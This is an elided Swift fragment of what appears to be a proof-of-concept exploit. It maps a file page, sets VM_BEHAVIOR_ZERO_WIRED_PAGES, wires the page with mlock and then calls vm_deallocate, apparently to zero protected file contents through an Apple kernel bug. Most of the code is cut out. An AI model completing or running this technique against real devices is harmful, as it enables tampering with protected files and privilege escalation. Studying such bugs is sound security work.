...
func mapFilePage(path: String) throws -> UnsafeMutableRawPointer {
    ...
    guard fd != -1 else {
        throw ExploitError.custom("Unwire failed")
    }
    ...
    guard mappedAt != MAP_FAILED else {
        close(fd)
        throw ExploitError.custom("Mapping failed")
    }
...
func zeroPoC(path: String) throws {
    ...
    guard kr == KERN_SUCCESS else {
        throw ExploitError.custom("failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry")
    }
    ...
    guard mlockErr == 0 else {
        throw ExploitError.custom("mlock failed")
    }
    print("mlock success")
    
    kr = vm_deallocate(mach_task_self_, pageVmAddress, vm_size_t(pageSize))
    guard kr == KERN_SUCCESS else {
        throw ExploitError.custom("vm_deallocate failed: \(String(cString: mach_error_string(kr)))")
    }
